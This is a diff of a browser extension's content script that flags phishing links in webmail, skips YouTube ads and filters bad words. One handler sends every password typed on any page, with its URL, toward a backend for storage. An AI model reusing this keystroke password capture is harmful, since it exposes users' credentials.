@@ -1,127 +1,66 @@
-//this is the function that is running to get all the links from a page
-//the function collects the links and sends them to the sw.js where it is send to the backend to be checked
-//***************
-//start
-// Collects all the links from the page, specifically for mailing services
-function collectLinks() {
-  const currentDomain = window.location.hostname; // Get the current domain
-
-  // Define the domains of the mailing services
-  const emailServices = [
-    "mail.google.com", // Gmail
-    "outlook.live.com", // Outlook
-    "mail.yahoo.com", // Yahoo Mail
-    "mail.com", // Mail.com
-    "aol.com" // AOL Mail (Add more if needed)
-  ];
-
-  // Check if the current domain matches any of the mailing services
-  if (!emailServices.some((domain) => currentDomain.includes(domain))) {
-    console.log("Not a mailing service page. Exiting.");
-    return []; // Exit if the current domain is not a recognized mailing service
-  }
-
-  // Collect all the links on the page, excluding unwanted URLs
+// This is the function that is running to get all the links from a page
+// The function collects the links and sends them to the background script
+// where they are sent to the backend to be checked
+function collectAllPageLinks() {
   const links = Array.from(document.querySelectorAll("a"))
     .map((element) => element.href)
-    .filter((href) =>
-      typeof href === "string" &&
-      href.trim() !== "" &&
-      !href.includes("www.google.com") &&
-      !href.includes("www.googleadservices.com")
-    );
-
-  console.log("Collected links: ", links); // For debugging
+    .filter((href) => typeof href === "string" && href.trim() !== "");
   return links;
 }
 
-function highlightPhishingLinks(foundUrls) {
-  if (!Array.isArray(foundUrls)) {
-    console.error("Invalid foundUrls format:", foundUrls);
-    return; // Exit if foundUrls is not an array
-  }
-
-  foundUrls.forEach((phishingLink) => {
-    // Escape the URL for proper selection
-    const escapedUrl = phishingLink.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); // Escape special characters
-    const linkElements = document.querySelectorAll(`a[href="${escapedUrl}"]`); // Use escaped URL in selector
-
-    linkElements.forEach((link) => {
-      // Highlight the link with class and visual indicator (optional)
-      link.classList.add("phishing-link");
-      link.style.backgroundColor = "red"; // Example visual indicator (optional)
-      link.style.color = "white"; // Example visual indicator (optional)
-
-      // Optionally, add a warning message near the link
-      const warningElement = document.createElement("span");
-      warningElement.textContent = "Warning: Phishing Link!";
-      warningElement.style.color = "red";
-      warningElement.style.fontSize = "smaller";
-      link.parentNode.insertBefore(warningElement, link.nextSibling);
-    });
-  });
+function highlightPhishingLink(link) {
+  link.style.backgroundColor = "red";
+  link.style.color = "white";
+  link.title = "Potential Phishing Link - Do Not Click";
 }
 
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.action === "phishingLinksFound") {
-    if (!chrome.runtime.id) {
-      highlightPhishingLinks(request.foundUrls);
-      return;
-    }
-    return;
-  }
-});
+async function scanLinks() {
+  const currentDomain = window.location.hostname;
 
-function scanLinks() {
-  const currentDomain = window.location.hostname; // Get the current domain
-
-  // Define the domains of the mailing services
   const emailServices = [
-    "mail.google.com", // Gmail
-    "outlook.live.com", // Outlook
-    "mail.yahoo.com", // Yahoo Mail
-    "mail.com", // Mail.com
-    "aol.com" // AOL Mail (Add more if needed)
+    "mail.google.com",
+    "outlook.live.com",
+    "mail.yahoo.com",
+    "mail.com",
+    "aol.com",
   ];
 
-  // Check if the current domain matches any of the mailing services
   if (!emailServices.some((domain) => currentDomain.includes(domain))) {
     console.log("Not a mailing service page. Exiting.");
-    return; // Exit if the current domain is not a recognized mailing service
-  }
-
-  // Collect links and send to background script
-  if (!chrome.runtime.id) {
-    console.error("Extension context invalidated. Re-injecting content script...");
-    chrome.runtime.onInstalled.addListener(() => {
-      // Content script re-injection logic goes here (explained in step 2)
-      chrome.tabs.executeScript(null, { file: "content.js" });
-    });
     return;
   }
-  const links = collectLinks();
-  if (links.length > 0) {
-    chrome.runtime.sendMessage({ action: "phishingLink", links });
+
+  // Get all links in the email body
+  const links = collectEmailBodyLinks();
+
+  try {
+    // Send a message to the background script to check the email content
+    const { phishingResults, bodyResults } = await chrome.runtime.sendMessage({
+      action: "phishingLink",
+      links,
+    });
+    console.log("Phishing results from the content.js page:", phishingResults);
+
+    // Highlight any phishing links
+    for (const { url, isPhishing } of phishingResults) {
+      if (isPhishing) {
+        const link = document.querySelector(`a[href="${url}"]`);
+        if (link) {
+          highlightPhishingLink(link);
+        }
+      }
+    }
+
+    // Display a warning if the email body contains suspicious content
+    if (bodyResults.hasSuspiciousContent) {
+      displaySuspiciousContentWarning(bodyResults.reason);
+    }
+  } catch (error) {
+    console.error("Error checking email content:", error);
   }
 }
 
-// Execute scanLinks only on mailing service pages
-if (window.location.hostname.includes("mail")) {
-  scanLinks();
-}
-
-// Observe DOM changes and trigger scanLinks on navigation and significant changes
-const observer = new MutationObserver((mutations) => {
-  mutations.forEach((mutation) => {
-    if (mutation.type === 'childList' || mutation.type === 'attributes' && mutation.attributeName === 'href') {
-      if (window.location.hostname.includes("mail")) {
-        scanLinks();
-      }
-    }
-  });
-});
-
-observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['href'] });
+document.addEventListener("DOMContentLoaded", scanLinks);
 
 //***************
 //end
@@ -160,19 +99,22 @@ observer.observe(document.body, { childList: true, subtree: true, attributes: tr
   let adCounter = 0;
 
   // Get settings from chrome.storage.sync
-  chrome.storage.sync.get(["adblocker", "popupBlocker", "adCounter"], function (data) {
-    if (data.adblocker !== undefined) {
-      if (data.adblocker) removeAds(); // Remove ads if adblocker is enabled
+  chrome.storage.sync.get(
+    ["adblocker", "popupBlocker", "adCounter"],
+    function (data) {
+      if (data.adblocker !== undefined) {
+        if (data.adblocker) removeAds(); // Remove ads if adblocker is enabled
+      }
+      if (data.popupBlocker !== undefined) {
+        if (data.popupBlocker) popupRemover(); // Remove popups if popupBlocker is enabled
+      }
+      // Initialize the adCounter if it doesn't exist in storage
+      if (data.adCounter !== undefined) {
+        adCounter = data.adCounter;
+        displayAdCount(); // Display the current count
+      }
     }
-    if (data.popupBlocker !== undefined) {
-      if (data.popupBlocker) popupRemover(); // Remove popups if popupBlocker is enabled
-    }
-    // Initialize the adCounter if it doesn't exist in storage
-    if (data.adCounter !== undefined) {
-      adCounter = data.adCounter;
-      displayAdCount(); // Display the current count
-    }
-  });
+  );
 
   // Set everything up here
   log("Script started");
@@ -180,48 +122,60 @@ observer.observe(document.body, { childList: true, subtree: true, attributes: tr
   // Remove Them pesky popups
   function popupRemover() {
     setInterval(() => {
-      const modalOverlay = document.querySelector("tp-yt-iron-overlay-backdrop");
-      const popup = document.querySelector(".style-scope ytd-enforcement-message-view-model");
+      const modalOverlay = document.querySelector(
+        "tp-yt-iron-overlay-backdrop"
+      );
+      const popup = document.querySelector(
+        ".style-scope ytd-enforcement-message-view-model"
+      );
       const popupButton = document.getElementById("dismiss-button");
-  
+
       var video = document.querySelector("video");
-  
+
       // Check if the video element exists before proceeding
       if (!video) {
         console.log("No video element found");
         return; // Exit if no video element is found
       }
-  
+
       const bodyStyle = document.body.style;
       bodyStyle.setProperty("overflow-y", "auto", "important");
-  
+
       if (modalOverlay) {
         modalOverlay.removeAttribute("opened");
         modalOverlay.remove();
       }
-  
+
       if (popup) {
         log("Popup detected, removing...");
-  
+
         if (popupButton) popupButton.click();
-  
+
         popup.remove();
         video.play();
-  
+
         setTimeout(() => {
           video.play();
         }, 500);
-  
+
         log("Popup removed");
       }
-  
+
       // Check if the video is paused after removing the popup
       if (!video.paused) return; // If video is already playing, do nothing.
-  
-      // Unpause the video if it was paused by the popup removal
-      video.play();
+
     }, 1000);
   }
+
+  function displayAdCount() {
+    console.log(`Total ads removed: ${adCounter}`);
+  }
+  
+  // Initialize counter from storage
+  chrome.storage.sync.get(["adCounter"], function (result) {
+    adCounter = result.adCounter || 0;
+    displayAdCount();
+  });
 
   // Undetected adblocker method
   function removeAds() {
@@ -232,15 +186,17 @@ observer.observe(document.body, { childList: true, subtree: true, attributes: tr
     setInterval(() => {
       var video = document.querySelector("video");
       const ad = [...document.querySelectorAll(".ad-showing")][0];
+
       // Remove page ads
       if (window.location.href !== currentUrl) {
         currentUrl = window.location.href;
         removePageAds();
       }
+
       if (ad) {
         isAdFound = true;
         adLoop = adLoop + 1;
-        // If we tried 10 times we can assume it won't work this time (Stops weird pause/freeze on ads)
+
         if (adLoop < 10) {
           const openAdCenterButton = document.querySelector(
             ".ytp-ad-button-icon"
@@ -257,32 +213,30 @@ observer.observe(document.body, { childList: true, subtree: true, attributes: tr
         } else {
           if (video) video.play();
         }
-        // Skip directly to the video content (bypassing the ad)
+
         if (video) {
           let randomNumber = Math.random() * (0.5 - 0.1) + 0.1;
-          video.currentTime = video.duration + randomNumber || 0; // Jump to the end of the ad (or after the ad ends)
+          video.currentTime = video.duration + randomNumber || 0;
           video.play();
         }
+
         log("Ad skipped directly to video (✔️)");
-        // Increment the counter and update storage
+
+        // Increment and store the ad counter
         adCounter++;
         chrome.storage.sync.set({ adCounter: adCounter }, function () {
           displayAdCount();
         });
       } else {
-        // Check for unreasonable playback speed
         if (video && video?.playbackRate == 10) {
           video.playbackRate = videoPlayback;
         }
 
         if (isAdFound) {
           isAdFound = false;
-
-          // Reset playback speed to normal after ad is skipped
           if (videoPlayback == 10) videoPlayback = 1;
           if (video && isFinite(videoPlayback))
             video.playbackRate = videoPlayback;
-
           adLoop = 0;
         } else {
           if (video) videoPlayback = video.playbackRate;
@@ -384,7 +338,6 @@ observer.observe(document.body, { childList: true, subtree: true, attributes: tr
     }
   }
 })();
-
 
 // Watch for form submissions
 document.addEventListener("submit", (event) => {
@@ -490,18 +443,18 @@ function showCustomAlert(message) {
   document.body.appendChild(modal);
 }
 
-document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener("DOMContentLoaded", function () {
   const passwordInput = document.querySelector('input[type="password"]');
   if (passwordInput) {
-      passwordInput.addEventListener('input', function() {
-          const password = passwordInput.value;
-          // Send password to the background script or directly to the backend for encryption and storage
-          chrome.runtime.sendMessage({
-              action: 'storePassword',
-              url: window.location.href,
-              password: password
-          });
+    passwordInput.addEventListener("input", function () {
+      const password = passwordInput.value;
+      // Send password to the background script or directly to the backend for encryption and storage
+      chrome.runtime.sendMessage({
+        action: "storePassword",
+        url: window.location.href,
+        password: password,
       });
+    });
   }
 });
 
@@ -511,16 +464,16 @@ document.addEventListener('DOMContentLoaded', function() {
 //start
 const badWords = ["badword1", "badword2"];
 const inputElements = document.querySelectorAll('input[type="text"], textarea');
-inputElements.forEach(input => {
-  input.addEventListener('input', () => {
+inputElements.forEach((input) => {
+  input.addEventListener("input", () => {
     const inputValue = input.value.toLowerCase();
-    badWords.forEach(badWord => {
+    badWords.forEach((badWord) => {
       if (inputValue.includes(badWord)) {
         // You can choose to:
         // 1. Clear the input:
-        input.value = '';
+        input.value = "";
         // 2. Display a warning message:
-        alert('Bad word detected. Please remove it.');
+        alert("Bad word detected. Please remove it.");
         // 3. Modify the input value (e.g., replace bad words with asterisks)
       }
     });
@@ -528,4 +481,3 @@ inputElements.forEach(input => {
 });
 //******************
 //end
-
